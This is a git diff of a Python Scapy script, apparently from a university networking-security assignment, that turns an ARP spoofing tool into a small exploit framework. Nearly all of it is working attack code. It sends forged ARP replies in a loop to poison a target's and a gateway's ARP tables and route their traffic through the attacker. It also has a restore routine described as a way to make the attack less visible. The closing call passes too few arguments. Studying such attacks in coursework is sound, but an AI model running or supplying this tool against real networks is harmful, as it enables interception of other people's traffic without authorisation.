@@ -1,61 +1,128 @@
 # /usr/bin/python3
 
-# ARP spoofing script by Jared 2003109@sit.singaporetech.edu.sg
+'''
+ICT2203 Networking Security: Assignment 1
+
+2003109 Jared Marc Song Kye-Jet
+2003XXX Low Weiyang
+2003XXX Amos Ng Zheng Jie
+2003XXX Kuo Eugene
+
+todo:
+- add more exploits
+- add method to call exploits similar to msfconsole
+'''
 
 from scapy.all import *
 from time import sleep
+import logging
 import argparse
 
-MALICIOUS_MAC = "ec:f4:bb:60:3f:0a" # our MAC
+logging.basicConfig(level=logging.INFO)
 
-def get_mac(desired_ip):
-	arp_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=desired_ip)
-	recv_packets = srp(arp_broadcast, timeout=2, verbose=0)
-	return recv_packets[0][0][1].hwsrc
+MAC_BROADCAST = "ff:ff:ff:ff:ff:ff"
+IPV4_BROADCAST = "255.255.255.255"
 
+class Exploit(object):
+	'''
+	Every exploit follows standard structure
+	- an init() method to setup the exploit
+	- an exploit() method to actually run the exploit
+	- a restore() method to undo the exploit, if persistent changes are made to the network
+	'''
+	def __init__(self):
+		self.get_own_mac()
+		self.params = dict()
 
-def do_spoof(gateway_ip, target_ip, delay, verbosity):
-	GATEWAY_MAC = get_mac(gateway_ip)
-	TARGET_MAC = get_mac(target_ip)
+	def exploit(self):
+		pass
 
-	print("Beginning ARP spoofing attack...")
-	print(f"Target MAC acquired: {TARGET_MAC}")
-	print(f"Gateway MAC accquired: {GATEWAY_MAC}")
+	def restore(self):
+		pass
 
-	RUN = True
-	while RUN:
-		try:
-			target_arp_spoofed = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=MALICIOUS_MAC)
-			gateway_arp_spoofed = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=GATEWAY_MAC)
-			send(target_arp_spoofed, verbose=verbosity)
-			sleep(delay)
-			send(gateway_arp_spoofed, verbose=verbosity)
-			sleep(delay)
-		except KeyboardInterrupt:
-			print("Exiting!")
-			RUN = False
-	
+	def show_params(self):
+		for param, value in self.params.items():
+			print(f"{param} => {value}")
 
-if __name__ == '__main__':
-	parser = argparse.ArgumentParser()
-	parser.add_argument("target_ip", help="IP of the target machine to ARP spoof")
-	parser.add_argument("gateway_ip", help="IP of the router/gateway to ARP spoof")
-	parser.add_argument("--delay", help="Delay between ARP broadcasts in seconds", type=float)
-	parser.add_argument("--verbosity", help="Control verbosity of ARP broadcast", type=int)
-	args = parser.parse_args()
+	'''
+	We also implement some utility methods that exploits can use.
+	'''
+	def get_own_mac(self):
+		'''
+		Returns own MAC address
+		'''
+		self.own_mac = Ether().src
 
-	if args.delay:
-		delay = args.delay
-	else:
-		delay = 0.2
-
-	if args.verbosity:
-		verbosity = int(args.verbosity)
-	else:
-		verbosity = 0
-
-	do_spoof(args.gateway_ip, args.target_ip, delay, verbosity)
-
-	
-	
+	def mac_from_ip(self, ip: str) -> str:
+		'''
+		Utility method for layer 2 exploits: resolves an IP to a MAC using ARP.
+		'''
+		arp_broadcast = Ether(dst=MAC_BROADCAST)/ARP(op=1, pdst=ip)
+		recv_packets = srp(arp_broadcast, timeout=2, verbose=0)
+		return recv_packets[0][0][1].hwsrc
 		
+
+class ARPSpoof(Exploit):
+	'''
+	This exploit implements a basic ARP spoofing attack - by overwriting the ARP tables of the gateway and target, all packets travelling between the two will be routed through our host.
+	As the ARP tables of the target host and gateway will be overwritten, the restore method is necessary.
+
+	'''
+	def __init__(self, gateway_ip: str, target_ip: str, verbosity: int, delay):
+		super().__init__()
+
+		self.verbosity = verbosity
+		self.gateway_ip = gateway_ip
+		self.target_ip = target_ip
+		self.delay = delay
+
+		self.gateway_mac = self.mac_from_ip(gateway_ip)
+		self.target_mac = self.mac_from_ip(target_ip)
+
+		self.run = True # boolean to handle exploit loop 
+
+		logging.info(f"Target IP: {self.target_ip}")
+		logging.info(f"Gateway IP: {self.gateway_ip}")
+		logging.info(f"Target MAC: {self.target_mac}")
+		logging.info(f"Gateway MAC: {self.gateway_mac}")
+
+	def exploit(self):
+		'''
+		As ARP tables have a decay timing, to perpetutate this attack packets need to be constantly sent.
+		'''
+		logging.info(f"Beginning ARP spoofing attack on {self.target_ip}")
+
+		target_arp_pkt = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst=self.own_mac)
+		gateway_arp_pkt = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwdst=self.gateway_mac)
+
+		while self.run:
+			try:
+				send(target_arp_pkt, verbose=0)
+				sleep(self.delay)
+				send(gateway_arp_pkt, verbose=0)
+				sleep(self.delay)
+			except KeyboardInterrupt:
+				logging.info("Ending ARP spoofing exploit...")
+				self.run = False
+				self.restore()
+
+	def restore(self):
+		'''
+		Even though the MAC tables will eventually restore themselves, we call this method to make our attack less visible.
+		'''
+		logging.info(f"Restoring original ARP tables...")
+
+		target_arp_pkt = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst=self.gateway_mac)
+		gateway_arp_pkt = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwdst=self.target_mac)
+
+		for repeat in range(5): # randomly chosen constant as of now
+			send(target_arp_pkt)
+			sleep(self.delay)
+			send(gateway_arp_pkt)
+			sleep(self.delay)
+
+		logging.info("ARP table restore complete!")
+
+	
+if __name__ == '__main__':
+	e = ARPSpoof("10.0.0.1", "10.0.0.2", 2)
